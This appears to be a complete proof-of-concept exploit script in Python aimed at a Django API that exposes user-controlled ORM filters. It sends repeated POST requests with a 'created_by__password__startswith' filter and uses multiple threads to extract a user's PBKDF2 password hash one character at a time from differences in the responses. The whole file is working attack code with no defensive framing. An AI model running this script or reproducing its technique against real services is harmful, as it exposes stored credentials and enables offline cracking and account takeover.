import argparse, requests, string, sys
from typing import Optional
from concurrent.futures import ThreadPoolExecutor

PBKDF2_CHARS = "_$/=+" + string.digits + string.ascii_letters
TOTAL_CHARS = len(PBKDF2_CHARS)

def parse_args() -> argparse.Namespace:
    """
        CLI argument parser
    """
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument(
        'target',
        help='URL path to Django API'
    )

    parser.add_argument(
        '-t', '--threads',
        help="Number of threads to use to speed up the exploit",
        default=20,
        type=int
    )

    return parser.parse_args()

def exploit(target: str, dumped_val: str, c: str) -> Optional[str]:
    # Need to add ?format=json to return JSON response
    r = requests.post(
        target + "?format=json",
        json={
            "created_by__password__startswith": dumped_val + c
        }
    )

    try:
        r_json = r.json()
        return c if len(r_json) > 1 else None
    except:
        return None

def main():
    args = parse_args()
    target = args.target
    threads = args.threads

    # Django password hashes start with pbkdf2_sha256$
    # This bit isn't needed to exploit, but makes it slightly faster
    dumped_hash: str = 'pbkdf2_sha256$'

    print(f"password hash: {dumped_hash}", end='')
    sys.stdout.flush()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            found_char = False
            futures = executor.map(
                exploit,
                [target] * TOTAL_CHARS,
                [dumped_hash] * TOTAL_CHARS,
                PBKDF2_CHARS
            )

            for result in futures:
                if not result is None:
                    dumped_hash = dumped_hash + result
                    print(result, end='')
                    sys.stdout.flush()
                    found_char = True
                    break

            if not found_char:
                break
    print()
    sys.stdout.flush()

if __name__ == "__main__":
    main()